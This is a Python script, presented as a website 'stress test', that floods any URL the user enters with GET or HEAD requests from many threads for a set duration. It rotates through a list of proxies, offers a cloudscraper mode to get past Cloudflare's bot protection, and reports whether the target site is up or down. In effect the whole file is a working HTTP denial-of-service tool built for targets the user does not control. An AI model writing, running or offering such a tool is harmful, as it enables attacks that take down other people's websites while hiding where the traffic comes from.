import cloudscraper
import httpx
from concurrent.futures import ThreadPoolExecutor, as_completed
from time import time, sleep
from threading import Lock

def send_request(url, until_datetime, method, proxies=None):
    while (until_datetime - time()) > 0:
        try:
            if proxies:
                proxy = proxies.pop(0)
                proxies.append(proxy)
                proxy_dict = {"http": proxy, "https": proxy}
            else:
                proxy_dict = None

            if method == "get":
                if proxy_dict:
                    response = httpx.get(url, proxies=proxy_dict)
                else:
                    response = httpx.get(url)
            elif method == "head":
                if proxy_dict:
                    response = httpx.head(url, proxies=proxy_dict)
                else:
                    response = httpx.head(url)
            elif method == "cfb":
                scraper = cloudscraper.create_scraper()
                if proxy_dict:
                    response = scraper.get(url, proxies=proxy_dict)
                else:
                    response = scraper.get(url)
        except Exception as e:
            pass

def check_website_status(url):
    try:
        response = httpx.head(url)
        if response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        return False

def print_colored(text, color):
    colors = {
        "red": "\033[91m",
        "green": "\033[92m",
        "blue": "\033[94m",
        "end": "\033[0m"
    }
    print(f"{colors[color]}{text}{colors['end']}")

if __name__ == "__main__":
    method = input("Enter request method (get/head/cfb): ")
    url = input("Enter website URL (including http:// or https://): ")
    num_threads = int(input("Enter number of threads to use: "))
    duration = int(input("Enter duration of stress test in seconds: "))
    use_proxies = input("Use proxies (y/n): ")
    if use_proxies.lower() == "y":
        with open("proxies.txt", "r") as f:
            proxies = [line.strip() for line in f]
    else:
        proxies = None
    until_datetime = time() + duration
    print_colored(f"Stress test started on {url} successfully!", "blue")
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(send_request, url, until_datetime, method, proxies) for _ in range(num_threads)]
        while (until_datetime - time()) > 0:
            if int(until_datetime - time()) % 10 == 0:
                if check_website_status(url):
                    print_colored("Website up", "green")
                else:
                    print_colored("Website down", "red")
            sleep(1)
        for future in as_completed(futures):
            future.result()
    print_colored("Stress test completed", "blue")
